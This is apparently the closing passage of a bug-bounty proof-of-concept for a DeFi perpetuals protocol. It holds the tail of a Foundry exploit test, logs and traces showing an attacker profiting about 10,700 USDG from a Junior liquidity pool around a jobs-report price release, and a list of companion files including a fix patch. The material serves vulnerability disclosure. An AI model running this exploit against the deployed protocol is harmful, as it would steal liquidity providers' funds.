        console2.log(string.concat("IMPACT HousePool.totalAssets, ATTACK vs HONEST: ", _usdSigned(poolVsHonest), " USDG"));
        console2.log(string.concat("IMPACT Senior, ATTACK vs HONEST: ", _usdSigned(seniorVsHonest), " USDG"));
        console2.log(string.concat("IMPACT treasury, ATTACK vs HONEST: ", _usdSigned(treasuryVsHonest), " USDG"));
        console2.log(
            string.concat(
                "IMPACT conservation, ATTACK vs HONEST: attacker ", _usdSigned(attackNet - honestNet), " = -(pool ",
                _usdSigned(poolVsHonest), " + treasury ", _usdSigned(treasuryVsHonest), ")"
            )
        );
        console2.log(string.concat("IMPACT cost of the kill: I0 bounty paid to the executor ", _usd(a.i0Bounty), " USDG"));
        console2.log(
            string.concat(
                "  unrelated SHORT trader's settlement balance, ATTACK / HONEST / BASELINE: ", _usd(a.otherBalance), " / ",
                _usd(h.otherBalance), " / ", _usd(b.otherBalance)
            )
        );

        assertEq(a.otherBalance, h.otherBalance, "the unrelated SHORT is untouched: same in every world");
        assertEq(a.otherBalance, b.otherBalance, "the unrelated SHORT is untouched: same as baseline");
        assertApproxEqAbs(
            attackNet - honestNet, -(poolVsHonest + treasuryVsHonest), 10, "the attacker's gain is the pool's loss"
        );
        assertEq(a.i0Code, 5, "ATTACK: I0 MARGIN_DRAINED_BY_FEES");
        assertEq(a.c1Code, 1, "ATTACK: C1 CLOSE_SIZE_EXCEEDS");
        assertEq(a.liveAfterKill, LIVE_AFTER_C0_LOTS, "ATTACK: LONG kept through the release");
        assertEq(a.exitPrice, PX_LONG_CLOSE_1330_35, "ATTACK: LONG closed at the real 13:30:35 price");
        assertEq(h.c1Reason, uint8(OrderV3Types.TerminalReason.Executed), "HONEST: binding close fills");
        assertEq(h.c1Price, PX_LONG_CLOSE_PIN, "HONEST: at the pre-release pin");
        assertEq(e.c1Price, PX_LONG_CLOSE_PIN, "EXECUTOR_FIRST: the attacker's worst case is the binding close");
        assertApproxEqAbs(e.attackerWallet, h.attackerWallet, 1e6, "EXECUTOR_FIRST ~= HONEST for the attacker");
        assertEq(b.attackerWallet, 0, "BASELINE: no attacker");
        assertGt(attackNet, 0, "ATTACK: attacker withdraws more USDG than it minted");
        assertLt(victimVsHonest, 0, "victim Junior LP loses vs the same orders with binding semantics");
        assertLt(victimVsBaseline, 0, "victim Junior LP loses vs no attacker");
    }

    function _pad(
        string memory s
    ) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        if (b.length >= 20) {
            return string.concat(s, " ");
        }
        bytes memory out = new bytes(20);
        for (uint256 i; i < 20; ++i) {
            out[i] = i < b.length ? b[i] : bytes1(" ");
        }
        return string(out);
    }
}
```

### Output

`clean-main-vv.log`, the impact test (4 of 4 tests pass):

```
828: [PASS] test_impact_nfpRelease() (gas: 66815027)
829: Logs:
830:   signal: Binance EUR/USDT last pre-release trade (x1e4) 11177
831:   signal: last trade by 13:30:02.300 (x1e4), trades since 13:30:00 11168 55
832:   signal: move in 1/100 bp (EUR down = USD up = basket down = LONG gains)
833:   -805
850:   ATTACK: C0 reason 1 live LONG lots after the kill 263100
851:   ATTACK: I0 reason / code (7/5 = PlannerRejected MARGIN_DRAINED_BY_FEES) 7 5
852:   ATTACK: C1 reason / code (7/1 = PlannerRejected CLOSE_SIZE_EXCEEDS) 7 1
853:   ATTACK: LONG closed at 13:30:35 publication, price 96194628
854:   HONEST: C1 reason (1 = Executed), price (the 13:30:00 pin) 1 96320333
855:   EXECUTOR_FIRST: C1 reason, price 1 96320333
856:                                          ATTACK              HONEST              EXECUTOR_FIRST      BASELINE
857:     attacker wallet (USDG)               310709.710983       277624.547633       277624.633378       0.000000            
858:     victim LP_J Junior value (USDG)      10007357.092660     10040433.025872     10040432.940128     10037946.036337     
859:     LP_S Senior value (USDG)             25000116.565194     25000116.565194     25000116.565194     25000116.565194     
860:     HousePool.totalAssets (USDG)         34992152.719450     35025228.655261     35025228.569517     35022741.665530     
861:     protocol treasury (USDG)             24925.554446        24934.781985        24934.781984        5046.625293         
862:   IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
863:   IMPACT attacker wallet net, ATTACK: +10709.710983 USDG (minted 300,000, all withdrawn)
864:   IMPACT attacker wallet net, HONEST (same orders, binding close): -22375.452367 USDG
865:   IMPACT attacker wallet net, EXECUTOR_FIRST (worst case for the attacker): -22375.366622 USDG
866:   IMPACT victim LP_J Junior, ATTACK vs HONEST: -33075.933212 USDG
867:   IMPACT victim LP_J Junior, ATTACK vs BASELINE (no attacker): -30588.943677 USDG
868:   IMPACT HousePool.totalAssets, ATTACK vs HONEST: -33075.935811 USDG
869:   IMPACT Senior, ATTACK vs HONEST: +0.000000 USDG
870:   IMPACT treasury, ATTACK vs HONEST: -9.227539 USDG
871:   IMPACT conservation, ATTACK vs HONEST: attacker +33085.163350 = -(pool -33075.935811 + treasury -9.227539)
872:   IMPACT cost of the kill: I0 bounty paid to the executor 0.105944 USDG
873:     unrelated SHORT trader's settlement balance, ATTACK / HONEST / BASELINE: 172213.509177 / 172213.509177 / 172213.509177
```

`clean-main-test_impact_nfpRelease-vvvv.log`, the attack world: the kill's withdrawal, the two terminal failures, the LONG closing at the 13:30:35 price, the HousePool paying the gain, and the attacker's wallet:

```
1755:    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, amount: 300000000000 [3e11])
1770:    │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: TraderAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], amount: 300000000000 [3e11])
4152:    │   │   │   │   │   │   ├─ emit PositionClosed(account: TraderAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], side: 0, sizeDelta: 2400000000000000000000 [2.4e21], price: 96320333 [9.632e7], pnl: -190680 [-1.906e5])
4333:    │   │   ├─ emit Withdraw(account: TraderAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], asset: MockSettlementToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 18672578 [1.867e7])
4651:    │   │   │   │   │   └─ ← [Revert] CfdEngine__TypedOrderFailure(1, 5, false)
4998:    │   │   │   │   │   └─ ← [Revert] CfdEngine__TypedOrderFailure(1, 1, true)
5807:    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HousePool: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 21241456110 [2.124e10])
5833:    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HousePool: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 9741199890 [9.741e9])
5852:    │   │   │   │   │   ├─ emit PositionClosed(account: TraderAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], side: 0, sizeDelta: 26310000000000000000000000 [2.631e25], price: 96194628 [9.619e7], pnl: 30982656000 [3.098e10])
5947:    │   │   ├─ emit Transfer(from: TraderAccount: [0x6b182f1488E8EfEb2Eb298155ed5Bd7FF8A14042], to: 0x00000000000000000000000000000000000A11cE, amount: 310709710983 [3.107e11])
```

The attacker's wallet goes from 300,000.000000 to 310,709.710983 USDG, +10,709.710983. HousePool paid the gain out as 21,241.456110 and 9,741.199890 USDG, and the victim LP_J's Junior ends 33,075.933212 USDG below the same orders with the close binding.

### Other files in the gist

- `CloseAdmissionSiblingFixPoC.t.sol` and `sibling-fix.patch`: the companion test. It imports the PoC file. Run it on a82d4fef, then again after `git apply sibling-fix.patch` with `SIBLING_FIX=true`: `forge test --match-path test/poc/CloseAdmissionSiblingFixPoC.t.sol --skip 'test/perps/**' --skip 'test/fixtures/**' --skip 'script/**' --match-test 'test_dedup_|test_branches_' -vv`. Raw output: `clean-companion-vv.log`, `fix-companion-vv.log`.
- `*-vvvv.log`: full traces of every test on both trees, with every call and event decoded by forge. `trace-key-lines.txt`: the lines above and the companion's key lines, grepped from the traces, with the commands.
- `VERSIONS.txt`: tool versions, both trees at `a82d4fef`, 0 modified `src` files on the clean tree, the fix tree's diff hash equal to `sibling-fix.patch`, 0 lines of `packages/perps/src` diff to the v2.0.0 release build `1209ca8a`, upstream master `6909f261`, and sha256 sums. Local paths are shown as `<repo-clean>`, `<repo-fix>` and `<finding>`. Nothing else differs from the raw output.
- `production-config-326633764.tsv`: every config value read from the deployed v2.0.0. `nfp-ticks.tsv`: the five real ticks decoded from their signed Pyth payloads. `keeper-latency-v2.0.0-summary.txt`: commit-to-terminal latency of the deployment's executor. `release-survey-summary.txt`: every release window in the v2.0.0 keeper record.

